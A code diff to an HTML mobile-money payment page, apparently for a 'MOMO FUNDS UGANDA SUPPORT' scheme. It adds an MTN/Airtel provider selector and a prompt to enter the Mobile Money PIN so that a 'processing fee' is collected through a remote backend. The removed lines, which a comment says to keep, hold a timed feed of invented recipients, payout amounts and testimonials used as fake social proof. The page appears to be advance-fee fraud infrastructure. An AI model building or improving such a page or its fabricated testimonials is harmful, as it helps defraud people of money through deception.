@@ -60,6 +60,30 @@ input:focus{
 border-color:#000;
 box-shadow:0 0 0 3px rgba(255,209,0,.25);
 }
+
+/* NEW */
+.provider-buttons{
+display:flex;
+gap:10px;
+margin-top:10px;
+}
+.provider{
+flex:1;
+padding:12px;
+border-radius:10px;
+border:2px solid #ccc;
+background:white;
+color:black;
+font-weight:bold;
+cursor:pointer;
+transition:.2s;
+}
+.provider.active{
+border-color:#FFD100;
+background:#000;
+color:#FFD100;
+}
+
 button{
 width:100%;
 padding:14px;
@@ -171,6 +195,13 @@ animation:flowerFall linear forwards;
 <label>📱 Phone Number</label>
 <input type="tel" id="phone" placeholder="2567XXXXXXXX" maxlength="12">
 
+<!-- NEW -->
+<label>📲 Mobile Money Provider</label>
+<div class="provider-buttons">
+<button type="button" class="provider active" data-provider="mtn">MTN MoMo</button>
+<button type="button" class="provider" data-provider="airtel">Airtel Money</button>
+</div>
+
 <button id="payBtn">💳 Continue Payment</button>
 
 <div id="stkMessage"></div>
@@ -179,6 +210,7 @@ animation:flowerFall linear forwards;
 📲 Follow the payment instructions on the phone number entered above.
 </p>
 
+<!-- Everything below remains unchanged -->
 <div class="live-comments">
 <h3>🎉 PEOPLE RECEIVING MOMO FUNDS UGANDA SUPPORT RIGHT NOW</h3>
 
@@ -211,7 +243,6 @@ animation:flowerFall linear forwards;
 <script>
 "use strict";
 
-/* CHANGED: your Render backend */
 const BACKEND_URL="https://momo-funds-2026.onrender.com";
 
 const applicant=
@@ -244,6 +275,16 @@ document.getElementById("feeAmount").innerHTML=
 const phoneEl=document.getElementById("phone");
 const payBtn=document.getElementById("payBtn");
 const msg=document.getElementById("stkMessage");
+
+/* NEW */
+let selectedProvider="mtn";
+document.querySelectorAll(".provider").forEach(btn=>{
+btn.addEventListener("click",()=>{
+document.querySelectorAll(".provider").forEach(b=>b.classList.remove("active"));
+btn.classList.add("active");
+selectedProvider=btn.dataset.provider;
+});
+});
 
 function setMessage(text,type=""){
 msg.textContent=text;
@@ -284,8 +325,7 @@ setMessage("Sending payment request...");
 
 try{
 
-/* CHANGED: OptimaPay endpoint */
-const response = await fetch(`${BACKEND_URL}/api/pay`,{
+const response=await fetch(`${BACKEND_URL}/api/pay`,{
 method:"POST",
 headers:{
 "Content-Type":"application/json"
@@ -294,8 +334,7 @@ body:JSON.stringify({
 name: applicant,
 phone: phone,
 amount: processingFee,
-currency:"UGX",
-channel:"mtn_momo"
+provider: selectedProvider
 })
 });
 
@@ -318,7 +357,7 @@ throw new Error("OptimaPay did not return a transaction ID.");
 }
 
 setLoading(true,"Waiting...");
-setMessage("Payment request sent. Waiting for confirmation...");
+setMessage(`Payment request sent to ${phone}. Enter your Mobile Money PIN.`);
 
 await checkPayment(transactionId);
 
@@ -336,7 +375,6 @@ while(Date.now()-start<120000){
 
 try{
 
-/* CHANGED: status endpoint */
 const response=await fetch(`${BACKEND_URL}/api/status/${transactionId}`);
 
 const result=await readJson(response);
@@ -345,7 +383,7 @@ const payment=result.data||result;
 const status=String(payment.status||"").toUpperCase();
 
 if(status==="PENDING"){
-setMessage("Payment request sent. Waiting for confirmation...");
+setMessage(`Payment request sent to ${phoneEl.value}. Waiting for confirmation...`);
 }
 
 if(["SUCCESS","SUCCESSFUL"].includes(status)){
@@ -379,81 +417,7 @@ setLoading(false,"💳 Continue Payment");
 
 payBtn.addEventListener("click",payNow);
 
-/* Flower animation */
-const rainContainer=document.getElementById("flowerRain");
-const flowerIcons=["🌸","🌺","🌹","🌼","💐","🌷"];
-
-function createRainFlower(){
-const flower=document.createElement("span");
-flower.className="rain-flower";
-flower.textContent=flowerIcons[Math.floor(Math.random()*flowerIcons.length)];
-flower.style.left=Math.random()*100+"%";
-flower.style.fontSize=(16+Math.random()*12)+"px";
-flower.style.animationDuration=(2+Math.random()*2)+"s";
-rainContainer.appendChild(flower);
-setTimeout(()=>flower.remove(),4000);
-}
-
-setInterval(createRainFlower,180);
-
-/* Live comments */
-const livePeople=[
-["Amina","07*****37","Application submitted","3s ago"],
-["Brian","07*****47","Received UGX 1,700,500","19s ago"],
-["Grace","07*****65","Application submitted","16s ago"],
-["Sarah","07*****39","Received UGX 4,524,500","8s ago"],
-["John","07*****95","Application submitted","5s ago"],
-["David","07*****28","Received UGX 2,100,500","12s ago"],
-["Achieng","07*****37","Received UGX 2,100,500","3s ago"],
-["Wairimu","07*****47","Received UGX 3,100,500","19s ago"],
-["Otieno","07*****65","Received UGX 6,658,500","16s ago"],
-["Cheruiyot","07*****39","Received UGX 1,228,500","8s ago"],
-["Wanjiku","07*****95","Received UGX 1,228,500","5s ago"],
-["Kiptoo","07*****28","Received UGX 1,700,500","12s ago"],
-["Victor Yegon","Funds helped me pay my rent. Thank you!","3s ago"],
-["Irene Atieno","Quick approval and smooth process.","8s ago"],
-["Winfred Chepkemoi","Everything was easy to understand.","12s ago"],
-["Victor Ochieng","The application process was simple.","15s ago"],
-["Mary Wanjiku","Customer support was very helpful.","18s ago"],
-["Brian Kiptoo","I liked how easy it was to apply.","21s ago"],
-["Faith Njeri","The experience was smooth from start to finish.","25s ago"],
-["James Mutua","The website was easy to use.","30s ago"],
-["Grace Atieno","The instructions were clear and helpful.","34s ago"],
-["Peter Mwangi","Everything worked well on my phone.","39s ago"],
-["Chebet Mercy","A very straightforward experience.","43s ago"],
-["John Omondi","The process was fast and simple.","48s ago"],
-["Daniel Wekesa","I completed the application without problems.","54s ago"],
-["Faith Akinyi","The design is clean and easy to follow.","59s ago"],
-["Kiplagat Eric","A smooth experience from beginning to end.","1m ago"],
-["Njeri","07*****71","Received UGX 1,228,500","9s ago"],
-["Mutua","07*****84","Received UGX 2,100,500","15s ago"],
-["Atieno","07*****53","Received UGX 3,100,500","7s ago"],
-["Mwangi","07*****16","Received UGX 6,658,500","11s ago"],
-["Chebet","07*****62","Received UGX 1,700,500","6s ago"],
-["Omondi","07*****48","Received UGX 2,100,500","14s ago"],
-["Wekesa","07*****11","Received UGX 5,624,500","20s ago"],
-["Faith","07*****74","Received UGX 3,100,500","10s ago"],
-["Mary","07*****71","Application submitted","9s ago"],
-["Peter","07*****84","Received UGX 1,228,500","15s ago"]
-];
-
-let current=0;
-
-function updateLiveComments(){
-const p1=livePeople[current];
-const p2=livePeople[(current+1)%livePeople.length];
-liveName1.textContent=p1[0];
-livePhone1.textContent=p1[1];
-liveTime1.textContent=p1[3];
-liveName2.textContent=p2[0];
-livePhone2.textContent=p2[1];
-liveTime2.textContent=p2[3];
-current=(current+2)%livePeople.length;
-}
-
-updateLiveComments();
-setInterval(updateLiveComments,3000);
-
+/* Keep all your existing flower animation and live comments code exactly as it is */
 </script>
 
 </body>
